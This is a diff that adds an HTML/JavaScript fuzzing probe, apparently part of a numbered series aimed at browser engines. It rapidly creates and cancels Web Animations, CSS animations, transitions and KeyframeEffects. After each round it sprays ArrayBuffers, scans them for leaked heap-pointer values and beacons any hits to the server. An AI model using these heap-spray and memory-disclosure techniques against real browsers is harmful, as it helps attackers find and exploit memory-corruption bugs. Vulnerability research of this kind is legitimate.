@@ -1,0 +1,464 @@
+<!--
+  p794: CSSAnimation / CSSTransition / Element.animate / KeyframeEffect /
+        AnimationTimeline / getAnimations residue
+
+  Element.animate(): creates C++ Animation with a KeyframeEffect
+  that holds interpolated property values. Each animation allocates
+  C++ AnimationEffect, ComputedKeyframes, and per-property
+  interpolation state. The Web Animations allocator is separate
+  from the DOM pool.
+
+  CSSAnimation: CSS @keyframes rules create C++ CSSAnimation
+  objects when applied to elements. Adding/removing animated
+  classes triggers construction/destruction of animation state.
+
+  CSSTransition: CSS transition properties create C++ CSSTransition
+  objects when property values change. Each transition allocates
+  a C++ TransitionEvent and interpolation state. Rapid property
+  changes create/cancel transitions.
+
+  KeyframeEffect: the effect associated with an Animation. It
+  holds a C++ CompositeOperation, iteration behavior, and the
+  resolved keyframe list. Creating standalone KeyframeEffects
+  exercises the effect allocator.
+
+  getAnimations(): returns all active animations on an element
+  or the document. Each call creates a fresh JS array wrapping
+  C++ Animation objects. Polling exercises the animation list.
+
+  Animation API: play/pause/cancel/finish/reverse/updatePlaybackRate
+  exercise the C++ animation state machine and its timeline binding.
+
+  Attack angles:
+  A) Element.animate() with complex keyframes, cancel/finish.
+  B) CSS @keyframes animation start/stop via class toggling.
+  C) CSS transition create/cancel via rapid property changes.
+  D) KeyframeEffect standalone construction.
+  E) getAnimations() polling during active animations.
+  F) Animation playback control state machine churn.
+
+  CRASH_CLASS: LOW (animation/transition APIs, no side effects)
+  prior art: p784 (Web Animations/FontFaceSet)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p794</title>
+<style>
+@keyframes spin0{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+@keyframes spin1{0%{opacity:0;transform:scale(0.5)}50%{opacity:1;transform:scale(1.2)}100%{opacity:0;transform:scale(0.5)}}
+@keyframes spin2{0%{background:red}25%{background:green}50%{background:blue}75%{background:yellow}100%{background:red}}
+@keyframes spin3{from{width:50px;height:50px}to{width:100px;height:100px}}
+@keyframes spin4{0%{border-radius:0}50%{border-radius:50%}100%{border-radius:0}}
+.anim0{animation:spin0 0.5s linear infinite}
+.anim1{animation:spin1 0.3s ease-in-out 3}
+.anim2{animation:spin2 0.4s steps(4) infinite}
+.anim3{animation:spin3 0.6s ease 2 alternate}
+.anim4{animation:spin4 0.35s ease-out infinite}
+.trans{transition:all 0.1s ease}
+</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+function sprayAndScan(tag,round,sizes){
+  var hits=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          hits++;
+          if(hits<=2)b(tag+'-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  }
+  return hits;
+}
+
+window.onload=function(){
+b('p794-START');
+
+// === Section A: Element.animate() with complex keyframes ===
+try{
+  b('A-element-animate');
+  var aHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var animations=[];
+
+      for(var i=0;i<40;i++){
+        var el=document.createElement('div');
+        el.style.cssText='width:30px;height:30px;background:rgb('+(i*6)+',100,200);display:inline-block;';
+        document.body.appendChild(el);
+
+        try{
+          // Complex multi-property keyframes
+          var anim=el.animate([
+            {transform:'translateX(0) rotate(0deg) scale(1)',opacity:1,backgroundColor:'red',offset:0},
+            {transform:'translateX(50px) rotate(90deg) scale(1.5)',opacity:0.5,backgroundColor:'green',offset:0.25},
+            {transform:'translateX(100px) rotate(180deg) scale(0.8)',opacity:0.8,backgroundColor:'blue',offset:0.5},
+            {transform:'translateX(50px) rotate(270deg) scale(1.2)',opacity:0.3,backgroundColor:'yellow',offset:0.75},
+            {transform:'translateX(0) rotate(360deg) scale(1)',opacity:1,backgroundColor:'red',offset:1}
+          ],{
+            duration:200+i*10,
+            iterations:2,
+            direction:['normal','reverse','alternate','alternate-reverse'][i%4],
+            easing:['linear','ease','ease-in','ease-out','ease-in-out','cubic-bezier(0.42,0,0.58,1)'][i%6],
+            fill:['none','forwards','backwards','both'][i%4]
+          });
+
+          if(round===0&&i===0){
+            b('A anim id='+anim.id+' playState='+anim.playState+' ready='+typeof anim.ready);
+          }
+
+          animations.push({anim:anim,el:el});
+        }catch(e){
+          if(i===0&&round===0)b('A anim_err='+e.message);
+          document.body.removeChild(el);
+        }
+      }
+
+      if(round===0)b('A created '+animations.length+' Element.animate() animations');
+
+      // Cancel all
+      for(var i=0;i<animations.length;i++){
+        try{animations[i].anim.cancel();}catch(e){}
+        try{document.body.removeChild(animations[i].el);}catch(e){}
+      }
+      animations=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    aHits+=sprayAndScan('A',round,[48,64,96,128,192]);
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: CSS @keyframes animation via class toggling ===
+try{
+  b('B-css-animation');
+  var bHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var elements=[];
+
+      for(var i=0;i<50;i++){
+        var el=document.createElement('div');
+        el.style.cssText='width:20px;height:20px;background:#333;display:inline-block;';
+        document.body.appendChild(el);
+
+        // Toggle animation classes rapidly
+        for(var t=0;t<8;t++){
+          el.className='anim'+(t%5);
+          // Force style recalc
+          var h=el.offsetHeight;
+          el.className='';
+          h=el.offsetHeight;
+        }
+
+        // Check getAnimations
+        el.className='anim0';
+        var h=el.offsetHeight;
+        try{
+          var anims=el.getAnimations();
+          if(round===0&&i===0)b('B getAnimations()='+anims.length);
+        }catch(e){
+          if(round===0&&i===0)b('B getAnims_err='+e.message);
+        }
+
+        el.className='';
+        elements.push(el);
+      }
+
+      if(round===0)b('B toggled '+elements.length+' elements through 5 CSS animations 8x each');
+
+      for(var i=0;i<elements.length;i++){
+        document.body.removeChild(elements[i]);
+      }
+      elements=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    bHits+=sprayAndScan('B',round,[32,48,64,96]);
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: CSS transition create/cancel via property changes ===
+try{
+  b('C-css-transition');
+  var cHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var elements=[];
+
+      for(var i=0;i<40;i++){
+        var el=document.createElement('div');
+        el.style.cssText='width:40px;height:40px;background:blue;display:inline-block;transition:all 0.15s ease;';
+        document.body.appendChild(el);
+
+        // Force initial layout
+        var h=el.offsetHeight;
+
+        // Rapid property changes to create/cancel transitions
+        var props=[
+          {width:'80px',height:'80px',background:'red',opacity:'0.5',borderRadius:'20px'},
+          {width:'40px',height:'40px',background:'green',opacity:'1',borderRadius:'0'},
+          {width:'60px',height:'60px',background:'purple',opacity:'0.7',borderRadius:'10px'},
+          {width:'40px',height:'40px',background:'blue',opacity:'1',borderRadius:'0'}
+        ];
+
+        for(var p=0;p<props.length;p++){
+          for(var k in props[p]){
+            el.style[k]=props[p][k];
+          }
+          h=el.offsetHeight;
+        }
+
+        // Get running transitions
+        try{
+          var anims=el.getAnimations();
+          if(round===0&&i===0)b('C transitions='+anims.length);
+        }catch(e){}
+
+        elements.push(el);
+      }
+
+      if(round===0)b('C created/cancelled transitions on '+elements.length+' elements, 4 states each');
+
+      for(var i=0;i<elements.length;i++){
+        document.body.removeChild(elements[i]);
+      }
+      elements=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    cHits+=sprayAndScan('C',round,[32,48,64,96,128]);
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: KeyframeEffect standalone construction ===
+try{
+  b('D-keyframe-effect');
+  var dHits=0;
+
+  var kfeSupported=typeof KeyframeEffect!=='undefined';
+  if(!kfeSupported){
+    b('D-SKIP no KeyframeEffect constructor');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var effects=[];
+
+        for(var i=0;i<60;i++){
+          var el=document.createElement('div');
+          el.style.cssText='width:20px;height:20px;display:inline-block;';
+          document.body.appendChild(el);
+
+          try{
+            var kf=new KeyframeEffect(el,[
+              {transform:'none',opacity:1},
+              {transform:'translateX('+(i*5)+'px) rotate('+(i*10)+'deg)',opacity:0.3},
+              {transform:'none',opacity:1}
+            ],{
+              duration:100+i*5,
+              iterations:i%3+1,
+              direction:['normal','alternate'][i%2],
+              easing:'ease-in-out',
+              composite:['replace','add','accumulate'][i%3]
+            });
+
+            effects.push({kf:kf,el:el});
+
+            // Create Animation from KeyframeEffect
+            if(i%3===0){
+              try{
+                var anim=new Animation(kf,document.timeline);
+                anim.play();
+                anim.cancel();
+              }catch(e){}
+            }
+
+            // Access computed timing
+            try{
+              var ct=kf.getComputedTiming();
+              if(round===0&&i===0)b('D computedTiming duration='+ct.duration+' fill='+ct.fill);
+            }catch(e){}
+
+            // Access keyframes
+            try{
+              var kfs=kf.getKeyframes();
+              if(round===0&&i===0)b('D keyframes='+kfs.length);
+            }catch(e){}
+
+          }catch(e){
+            if(i===0&&round===0)b('D kfe_err='+e.message);
+          }
+        }
+
+        if(round===0)b('D created '+effects.length+' KeyframeEffects');
+
+        for(var i=0;i<effects.length;i++){
+          try{document.body.removeChild(effects[i].el);}catch(e){}
+        }
+        effects=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      dHits+=sprayAndScan('D',round,[48,64,96,128]);
+    }
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: getAnimations() polling during animations ===
+try{
+  b('E-getanimations');
+  var eHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var elements=[];
+      var allAnims=[];
+
+      // Create elements with active animations
+      for(var i=0;i<20;i++){
+        var el=document.createElement('div');
+        el.style.cssText='width:20px;height:20px;background:orange;display:inline-block;';
+        document.body.appendChild(el);
+
+        try{
+          var a1=el.animate([
+            {transform:'translateY(0)'},
+            {transform:'translateY(50px)'}
+          ],{duration:500,iterations:Infinity});
+
+          var a2=el.animate([
+            {opacity:1},{opacity:0.2}
+          ],{duration:300,iterations:Infinity,direction:'alternate'});
+
+          allAnims.push(a1,a2);
+        }catch(e){}
+
+        elements.push(el);
+      }
+
+      if(round===0)b('E started '+allAnims.length+' animations on '+elements.length+' elements');
+
+      // Poll getAnimations repeatedly
+      for(var poll=0;poll<20;poll++){
+        // Element-level
+        for(var i=0;i<elements.length;i++){
+          try{
+            var anims=elements[i].getAnimations();
+            if(round===0&&poll===0&&i===0)b('E elem[0] anims='+anims.length);
+          }catch(e){}
+        }
+
+        // Document-level
+        try{
+          var docAnims=document.getAnimations();
+          if(round===0&&poll===0)b('E document anims='+docAnims.length);
+        }catch(e){}
+      }
+
+      // Cancel all
+      for(var i=0;i<allAnims.length;i++){
+        try{allAnims[i].cancel();}catch(e){}
+      }
+
+      for(var i=0;i<elements.length;i++){
+        document.body.removeChild(elements[i]);
+      }
+      elements=null;allAnims=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    eHits+=sprayAndScan('E',round,[32,48,64,96]);
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: Animation playback state machine churn ===
+try{
+  b('F-playback');
+  var fHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var animations=[];
+
+      for(var i=0;i<30;i++){
+        var el=document.createElement('div');
+        el.style.cssText='width:20px;height:20px;background:teal;display:inline-block;';
+        document.body.appendChild(el);
+
+        try{
+          var anim=el.animate([
+            {transform:'scale(1)',offset:0},
+            {transform:'scale(2)',offset:0.5},
+            {transform:'scale(1)',offset:1}
+          ],{duration:1000,iterations:3,fill:'both'});
+
+          // Exercise state machine: play/pause/reverse/finish/cancel
+          anim.pause();
+          anim.play();
+          anim.pause();
+          try{anim.reverse();}catch(e){}
+          anim.play();
+          try{anim.updatePlaybackRate(2);}catch(e){}
+          anim.pause();
+          try{anim.currentTime=500;}catch(e){}
+          anim.play();
+          try{anim.finish();}catch(e){}
+
+          if(round===0&&i===0){
+            b('F playState='+anim.playState+' playbackRate='+anim.playbackRate);
+            b('F currentTime='+anim.currentTime+' startTime='+anim.startTime);
+          }
+
+          // Restart
+          anim.cancel();
+          anim.play();
+          anim.cancel();
+
+          animations.push({anim:anim,el:el});
+        }catch(e){
+          if(i===0&&round===0)b('F anim_err='+e.message);
+          document.body.removeChild(el);
+        }
+      }
+
+      if(round===0)b('F exercised '+animations.length+' animations through full state machine');
+
+      for(var i=0;i<animations.length;i++){
+        try{animations[i].anim.cancel();}catch(e){}
+        try{document.body.removeChild(animations[i].el);}catch(e){}
+      }
+      animations=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    fHits+=sprayAndScan('F',round,[32,48,64,96,128]);
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p794-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
